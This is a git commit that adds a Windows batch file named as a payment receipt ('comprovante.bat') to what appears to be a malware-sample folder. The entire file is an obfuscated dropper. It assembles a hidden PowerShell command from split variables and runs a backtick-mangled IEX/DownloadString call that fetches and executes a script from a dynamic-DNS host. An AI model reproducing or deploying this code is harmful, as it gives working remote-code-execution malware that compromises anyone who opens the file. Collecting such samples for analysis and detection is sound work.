2b6a4e14880f624ea429366fdd7154d3ae1c5285
p4y104d <32499443+p4y104d@users.noreply.github.com>
2019-08-02 12:01:31 -0500

    Add files via upload

---
+++ muestra_bat/comprovante.bat
@@ -0,0 +1,19 @@
+@echo off
+cd %SystemRoot%\System32
+set a=Win
+set b=dow
+set c=sPo
+set d=wer
+set e=She
+set f=ll\
+set g=v1.
+set h=0\po
+set i=we
+set j=rsh
+set k=ell
+set l=.ex
+set m=e -n
+set n=op 
+set o=-w
+set p=in 1 -
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('http://a9b1-c34fd1.hopto.org/L2607/kk/1445785485')"); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
